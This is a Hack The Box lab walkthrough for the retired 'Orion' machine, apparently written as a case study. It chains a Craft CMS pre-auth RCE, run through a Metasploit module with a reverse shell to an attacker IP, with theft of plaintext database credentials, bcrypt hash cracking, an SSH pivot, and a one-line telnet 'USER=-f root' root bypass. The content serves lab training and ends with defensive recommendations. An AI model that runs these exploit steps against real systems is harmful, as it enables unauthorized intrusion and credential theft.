---
title: "Orion: Craft CMS pre-auth RCE to local telnet bypass"
description: "Craft CMS pre-authentication RCE (CVE-2025-32432) and plaintext database credentials lead to an administrator hash and SSH access; a GNU inetutils telnet authentication bypass (CVE-2026-24061) on loopback yields root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - cms
  - credential-access
  - privesc
---

## Summary

Orion is a Hack The Box lab machine running SSH and an nginx web server fronting a Craft CMS 5.6.16 application. Enumeration identifies the CMS version and exposes an admin login endpoint. Exploitation relies on CVE-2025-32432, a pre-authentication remote code execution vulnerability in Craft CMS, to obtain a `www-data` shell. Post-exploitation credential discovery reveals plaintext MySQL credentials in the application environment file, and database access produces an admin bcrypt hash. Offline cracking recovers a password reused for SSH access. Local enumeration then reveals a telnet service bound to the loopback address, and the installed GNU inetutils version is vulnerable to CVE-2026-24061. Exploiting this authentication bypass through the USER environment variable yields root.

> This case study is based on a retired Hack The Box lab. Operator and target IPs, local hostnames, wordlist paths, and credential material have been replaced with role-based placeholders where needed.

## Context and Objective

The objective is to document a supported lab walkthrough from initial enumeration through privilege escalation, preserving technical observation, command syntax, and evidentiary limitations. The lab environment provides an external-facing HTTP service on port 80 and SSH on port 22, with additional sensitive configuration and local services accessible only after initial access.

Scope limitations relevant to the narrative include:

- The exact enumeration wordlist used is not recorded in the source notes.
- Generic tool names are used where the source did not record precise utility variants.
- Application and operating system account passwords are redacted; the cracked password is shown only as a placeholder.
- No active targeting, brute forcing, or unauthorized external testing is implied; all work occurred within an isolated lab.

## Approach and Evidence

### External enumeration

A fast TCP scan identified SSH and an nginx web server:

```bash
mkdir nmap ; rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Orion-TCP
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

The recorded output shows the web service redirected to a target hostname. The lab notes added that hostname to `/etc/hosts` to reach the application consistently:

```bash
echo '<TARGET_IP> <TARGET_HOSTNAME>' | sudo tee -a /etc/hosts
```

Directory discovery then exposed an admin login page at `/admin/login`. The login page identified the platform as **Craft CMS 5.6.16**, and the notes associated that version with **CVE-2025-32432**.

### Pre-authentication remote code execution

Exploitation used a public pre-auth RCE path for the identified Craft CMS version. The recorded approach relied on an existing Metasploit module for **CVE-2025-32432**:

```bash
msfconsole
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set rhosts <TARGET_HOSTNAME>
set rport 80
set lhost <ATTACKER_IP>
exploit
```

The recorded output shows the exploit returning an interactive shell as `www-data` on the web server. A TTY upgrade step was then used to stabilize the session:

```bash
script /dev/null -c /bin/bash
```

This provided a persistent enough shell to continue post-exploitation from the application host.

### Credential discovery in Craft CMS configuration

Post-exploitation file review located the Craft CMS environment file. The recorded content included a database driver, host, service account, and plaintext database password. As required for public-safe writing, the specific secret values are omitted here.

The command shown is representative only:

```bash
cat <CRAFT_CMS_ENVIRONMENT_FILE>
```

The technical significance is that Craft CMS stored active database credentials in a readable plaintext environment file, and the compromised web-service account had sufficient access to retrieve them.

### MySQL database access and hash retrieval

Using the discovered database credentials, the attacker accessed MySQL and enumerated available databases. The recorded output listed a target database named after the host application:

```bash
mysql -u root -p'<DB_PASSWORD>'
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| <APPLICATION_DATABASE> |
| performance_schema |
| sys                |
+--------------------+
```

After selecting the application database, the attacker listed tables and queried the user store. The recorded query returned an administrator record including a bcrypt password hash:

```sql
use <APPLICATION_DATABASE>;
show tables;
select id, email, password from users\G
```

The notes show one administrative account with an associated bcrypt hash. That credential artifact was then taken offline for cracking.

### Hash cracking and SSH pivot

The hash was cracked offline with the documented wordlist and mode selection. The source notes record a successful recovery, but the actual cleartext credential is omitted from this draft and replaced with a placeholder:

```bash
hashcat -m <BCRYPT_MODE> <HASH_FILE> <WORDLIST_PATH> -D2
<CRACKED_PASSWORD>
```

The notes report that the recovered credential granted SSH access as a named host user. The command shown is representative only and uses placeholders:

```bash
sshpass -p '<SSH_USER_PASSWORD>' ssh <SSH_USER>@<TARGET_HOSTNAME>
```

This pivot is significant because it transitions access from the anonymous web service account to a named operating system account, expanding the local attack surface.

### Local privilege escalation via telnet authentication bypass

Once on the host as the SSH user, local service enumeration showed a telnet service bound only to the loopback interface. The recorded netstat output captured the listening address:

```bash
netstat -tulnp
tcp        0      0 127.0.0.1:23            0.0.0.0:*               LISTEN      -
```

The installed client version was confirmed as **GNU inetutils 2.7**:

```bash
telnet --version
telnet (GNU inetutils) 2.7
```

The source notes identify **CVE-2026-24061** as an authentication bypass related to the USER environment variable. In this lab configuration, that variable was interpreted in a way that allowed the attacker to request root-level execution when connecting to the local telnet service:

```bash
export USER="-f root"
telnet -a 127.0.0.1
root@<TARGET_HOSTNAME>:~#
```

This final stage converted local user access into root, completing the privilege escalation path.

## Challenges and Decisions

No failed attempts or complex remediation obstacles are recorded in the source notes for this machine. The attack path proceeds cleanly through four major stages:

1. Pre-auth exploitation of the CMS.
2. Credential discovery from application configuration.
3. Offline hash cracking.
4. Authentication bypass against a legacy local service.

One decision worth noting is the SSH pivot rather than attempting further web-only post-exploitation. Moving to a named user account exposed the local telnet escalation route that would not have been reachable from the unauthenticated web-service context alone.

## Outcome

The evidence supports the following chain:

- **CVE-2025-32432** provided an initial pre-auth shell as `www-data`.
- Plaintext application credentials allowed MySQL access and administrator hash extraction.
- Offline cracking produced a password reused for SSH.
- **CVE-2026-24061** converted local access into root via a telnet authentication bypass.

Limitations of the narrative:

- Exact operator and target IPs are intentionally omitted.
- The enumeration wordlist is not documented in the source notes.
- The cracked password is shown only as a placeholder, not as a literal credential.
- Technical descriptions of CVE behavior are limited to the lab-observed impact rather than full vulnerability analysis.

## Lessons and Recommendations

- **CMS patching is critical.** Pre-authentication RCE in a public-facing application can immediately compromise the entire web tier.
- **Environment secrets must be restricted.** Plaintext credentials in `.env` or similar application files allow rapid credential escalation once a web-shell or file-read path exists.
- **Password reuse across tiers amplifies risk.** A cracked application credential should not double as an operating system login.
- **Loopback services are not safe by default.** Services bound to 127.0.0.1 still threaten local users, especially when legacy binaries are present.
- **Software inventory matters.** The telnet escalation path depended on a vulnerable installed version of GNU inetutils, not on an externally exposed service.

Recommendations, distinct from what was tested here, include centralized secrets management, application credential isolation, version pinning with patch monitoring, and local service auditing even on non-internet-facing ports.

## References

- Hack The Box — [Orion](https://app.hackthebox.com/machines/Orion)
- CVE-2025-32432: pre-authentication RCE in Craft CMS
- CVE-2026-24061: GNU inetutils telnet USER environment variable authentication bypass
